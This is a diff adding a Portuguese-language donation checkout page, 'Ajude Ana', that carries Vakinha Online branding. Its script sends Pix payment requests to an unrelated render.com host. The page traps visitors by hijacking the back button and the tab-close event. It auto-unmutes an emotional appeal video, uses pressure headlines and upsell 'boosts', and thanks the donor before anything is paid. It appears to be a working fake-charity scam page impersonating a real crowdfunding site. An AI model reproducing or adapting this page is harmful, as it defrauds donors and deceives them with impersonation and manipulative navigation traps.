@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Checkout - Ajude Ana</title>
+  <link rel="stylesheet" href="./assets/styles.css" />
+  <style>
+    .contribute-button {
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0% {
+        transform: scale(1);
+      }
+
+      50% {
+        transform: scale(1.05);
+      }
+
+      100% {
+        transform: scale(1);
+      }
+    }
+
+    @keyframes shake {
+
+      0%,
+      100% {
+        transform: translateX(0);
+      }
+
+      25% {
+        transform: translateX(-2px);
+      }
+
+      75% {
+        transform: translateX(2px);
+      }
+    }
+
+    .tremendo {
+      animation: shake 1.5s infinite;
+    }
+
+    #toten {
+      width: 50px;
+    }
+  </style>
+</head>
+
+<body>
+  <header>
+    <div class="container">
+      <div class="content-header d-flex align-items-center justify-content-between">
+        <div class="logo">
+          <img src="./assets/logo.svg" alt="Vakinha Online" />
+        </div>
+        <script>
+          !function(f,b,e,v,n,t,s){
+            if(f.fbq)return;n=f.fbq=function(){n.callMethod ?
+            n.callMethod.apply(n,arguments) : n.queue.push(arguments)};
+            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+            n.queue=[];t=b.createElement(e);t.async=!0;
+            t.src=v;s=b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t,s)
+          }(window, document,'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+          fbq('init', '740264971662619'); // ← Substitua pelo seu ID
+          fbq('track', 'PageView');
+        </script>
+        <noscript>
+          <img height="1" width="1"
+               style="display:none"
+               src="https://www.facebook.com/tr?id=740264971662619&ev=PageView&noscript=1"/>
+        </noscript>
+
+
+        <style>
+          .anavideo {
+            width: 100%;
+            margin: auto;
+          }
+          .videovsl {
+            width: 100%;
+            border-radius: 10px; /* bordas arredondadas */
+            display: block;
+            margin-bottom: 10px;
+            border: 2px solid red;
+          }
+        </style>
+        
+        <div class="anavideo">
+          <video class="videovsl" src="assets/ctvaapela.mp4" autoplay muted playsinline></video>
+        </div>
+        
+        <script>
+          const video = document.querySelector('.videovsl');
+        
+          // Remover mute e colocar volume no máximo após autoplay (alguns navegadores exigem interação)
+          video.addEventListener('canplay', () => {
+            video.muted = false;
+            video.volume = 1.0;
+            video.play().catch(() => {
+              // alguns navegadores exigem interação do usuário
+            });
+          });
+        </script>
+        
+        <h1 style="color: red;">NÃO DESISTA! Ana precisa MUITO de você! Ajude mesmo com pouco</h1>
+        <div class="id-number">ID: 4452341</div>
+
+        <div class="value-input" style="margin-top: -20px;"> 
+          <div class="currency-prefix">R$</div>
+          <input type="tel" id="contribution-input" class="value-field" value="10,00" />
+        </div>
+        <div id="error-message" class="error-message" style="display: none;">
+          Valor mínimo da doação é de R$ 10,00
+        </div>
+        <div id="max-error-message" class="error-message" style="display: none;">
+          Valor máximo permitido é de R$ 700,00
+        </div>
+
+        <div class="section-title">Forma de pagamento</div>
+        <div class="payment-methods">
+          <div class="payment-option pix selected">
+            <span class="radio-button"></span>
+            <span>Pix</span>
+          </div>
+        </div>
+
+        <script>
+          // Empurra um estado no histórico para capturar o botão "voltar"
+          window.history.pushState(null, '', window.location.href);
+        
+          // Detecta botão "voltar"
+          window.addEventListener('popstate', function () {
+            window.location.href = 'index.html';
+          });
+         
+          // Detecta tentativa de fechar ou sair da aba
+          window.addEventListener('beforeunload', function (e) {
+            // Funciona melhor com um delay — mas nem sempre é garantido
+            setTimeout(() => {
+              window.location.href = 'index.html';
+            }, 0);
+          });
+        </script>
+
+        <div class="section-title">Turbine sua doação</div>
+        <div class="summary-item">
+          <span>Ajude MUITO MAIS turbinando sua doação 💚</span>
+        </div>
+        <div class="charity-options">
+          <div class="charity-item" data-value="10">
+            <img src="assets/lunam.png" class="charity-img" id="toten">
+            <div class="charity-name">Multiplicador de impacto</div>
+            <div class="charity-price">R$ 10,00</div>
+          </div>
+          <div class="charity-item" data-value="15">
+            <img src="assets/lunap.png" class="charity-img" id="toten">
+            <div class="charity-name">Brinquedo solidário</div>
+            <div class="charity-price">R$ 15,00</div>
+          </div>
+          <div class="charity-item" data-value="85">
+            <img src="assets/lunaa.png" class="charity-img" id="toten">
+            <div class="charity-name">Doar cesta básica</div>
+            <div class="charity-price">R$ 85,00</div>
+          </div>
+        </div>
+
+        <div class="summary">
+          <div class="summary-item">
+            <span>Contribuição extra:</span>
+            <span>R$ 0,00</span>
+          </div>
+          <div class="divider"></div>
+          <div class="summary-item">
+            <span>Total:</span>
+            <span>R$ 0,00</span>
+          </div>
+        </div>
+
+        <button class="contribute-button">Contribuir</button>
+      </div>
+    </div>
+  </header>
+
+  <script>
+    const API_URL = 'https://buckz-qcik.onrender.com/pix';
+
+    // Formatar valor
+    const input = document.getElementById("contribution-input");
+    input.addEventListener("input", () => {
+      let raw = input.value.replace(/\D/g, "");
+      if (raw.length < 3) raw = raw.padStart(3, "0");
+      const inteiro = raw.slice(0, -2).replace(/^0+/, "") || "0";
+      const centavos = raw.slice(-2);
+      input.value = `${inteiro},${centavos}`;
+      atualizarResumo();
+    });
+
+    // Atualiza valores totais
+    function atualizarResumo() {
+      const valor = parseFloat(input.value.replace(".", "").replace(",", ".")) || 0;
+      let adicional = 0;
+      document.querySelectorAll(".charity-item.selected").forEach(item => {
+        adicional += parseFloat(item.dataset.value);
+      });
+      const total = valor + adicional;
+      const spans = document.querySelectorAll(".summary .summary-item span:last-child");
+      spans[0].textContent = `R$ ${adicional.toFixed(2).replace(".", ",")}`;
+      spans[1].textContent = `R$ ${total.toFixed(2).replace(".", ",")}`;
+    }
+
+    atualizarResumo();
+
+    document.querySelectorAll(".charity-item").forEach(item => {
+      item.addEventListener("click", () => {
+        item.classList.toggle("selected");
+        atualizarResumo();
+      });
+    });
+
+    // Tremor alternado das imagens
+    const images = document.querySelectorAll(".charity-img");
+    let current = 0;
+    setInterval(() => {
+      images.forEach((img, idx) => img.classList.toggle("tremendo", idx === current));
+      current = (current + 1) % images.length;
+    }, 1800);
+
+    // Clique no botão
+    document.querySelector(".contribute-button").addEventListener("click", async () => {
+      const button = document.querySelector(".contribute-button");
+      button.textContent = "Gerando Pix...";
+      button.disabled = true;
+
+      const valor = parseFloat(input.value.replace(".", "").replace(",", ".")) || 0;
+      let adicional = 0;
+      document.querySelectorAll(".charity-item.selected").forEach(item => {
+        adicional += parseFloat(item.dataset.value);
+      });
+      const total = valor + adicional;
+
+      if (total < 10 || total > 700) {
+        document.getElementById("error-message").style.display = total < 20 ? "block" : "none";
+        document.getElementById("max-error-message").style.display = total > 700 ? "block" : "none";
+        button.textContent = "Contribuir";
+        button.disabled = false;
+        return;
+      }
+
+      const amountCentavos = Math.round(total * 100);
+
+      try {
+        const response = await fetch(API_URL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            external_id: "ajude-ana-" + Date.now(),
+            payment_method: "pix",
+            amount: amountCentavos,
+            buyer: {
+              name: "Contribuidor Anônimo",
+              email: "anonimo@email.com",
+            },
+          }),
+        });
+
+        const result = await response.json();
+
+        if (response.ok && result?.data?.pix?.qrcode_base64) {
+          // Tela verde com mensagem e confetes
+          document.body.innerHTML = `
+  <style>
+    body { margin: 0; padding: 0; overflow: hidden; }
+    .success-screen {
+      background-color: #28a745;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      height: 100vh;
+      font-family: sans-serif;
+      position: relative;
+      text-align: center;
+      font-size: 2rem;
+      padding: 20px;
+    }
+    .confetti {
+      position: absolute;
+      width: 10px;
+      height: 10px;
+      background-color: white;
+      animation: confetti-fall 1.5s linear forwards;
+    }
+    @keyframes confetti-fall {
+      0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
+      100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
+    }
+  </style>
+  <div class="success-screen">
+    <div>Parabéns pela contribuição,<br>você está ajudando a salvar uma vida ❤️</div>
+  </div>
+`;
+
+          for (let i = 0; i < 40; i++) {
+            const confetti = document.createElement("div");
+            confetti.classList.add("confetti");
+            confetti.style.left = `${Math.random() * 100}vw`;
+            confetti.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 70%)`;
+            confetti.style.animationDuration = `${1 + Math.random()}s`;
+            confetti.style.width = confetti.style.height = `${6 + Math.random() * 6}px`;
+            document.body.appendChild(confetti);
+          }
+
+          setTimeout(() => {
+            document.body.innerHTML = `
+              <div style="text-align: center; padding: 20px; font-family: sans-serif;">
+                <h2>Escaneie o QR Code abaixo para concluir sua doação 💚</h2>
+                <div style="display: flex; justify-content: center;">
+                <img src="data:image/png;base64,${result.data.pix.qrcode_base64}" style="max-width: 400px; margin: 5px 0;" />
+                </div>
+                <p><strong>Pix copia e cola:</strong></p>
+                <textarea id="pix-code" style="width: 90%; height: 80px;">${result.data.pix.code}</textarea>
+                <br />
+                <button id="copy-button" class="contribute-button" style="margin-top: 10px;">Copiar código Pix</button>
+                <p id="copy-message" style="color: green; display: none; margin-top: 8px;">Código copiado com sucesso!</p>
+                <p style="color: gray;">Após o pagamento, sua doação será confirmada automaticamente.</p>
+              </div>
+            `;
+
+            document.getElementById("copy-button").addEventListener("click", () => {
+              const pixCode = document.getElementById("pix-code").value;
+              navigator.clipboard.writeText(pixCode).then(() => {
+                const msg = document.getElementById("copy-message");
+                msg.style.display = "block";
+                setTimeout(() => msg.style.display = "none", 2000);
+              });
+            });
+          }, 1500);
+        } else {
+          alert("Erro: " + (result?.error?.message || "Erro ao gerar o Pix"));
+          button.textContent = "Contribuir";
+          button.disabled = false;
+        }
+      } catch (err) {
+        console.error(err);
+        alert("Erro inesperado.");
+        button.textContent = "Contribuir";
+        button.disabled = false;
+      }
+    });
+  </script>
+</body>
+
+</html>
